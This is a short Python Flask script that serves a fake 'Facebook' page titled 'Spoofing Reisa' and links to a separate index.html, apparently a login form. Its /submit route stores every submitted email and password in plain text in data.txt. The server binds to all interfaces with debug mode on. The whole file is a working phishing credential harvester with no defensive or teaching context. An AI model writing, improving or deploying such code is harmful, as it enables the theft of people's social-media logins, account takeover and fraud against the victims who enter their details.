from flask import Flask, request
import webbrowser

app = Flask(__name__)

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Spoofing Reisa</title>
    </head>
    <body>
        <h1>Facebook</h1>
        <input type="button" value="Click Me" onclick="window.location.href='/index.html'">
    </body>
    </html>
    """

@app.route('/index.html')
def index():
    with open('index.html', 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    with open('data.txt', 'a') as f:
        f.write(f"{email}:{password}\n")
    return "Data saved successfully!"

if __name__ == '__main__':
    # Buka browser otomatis ke localhost:8080
    webbrowser.open("http://localhost:8080")
    # Jalankan server di port 8080
    app.run(host='0.0.0.0', port=8080, debug=True)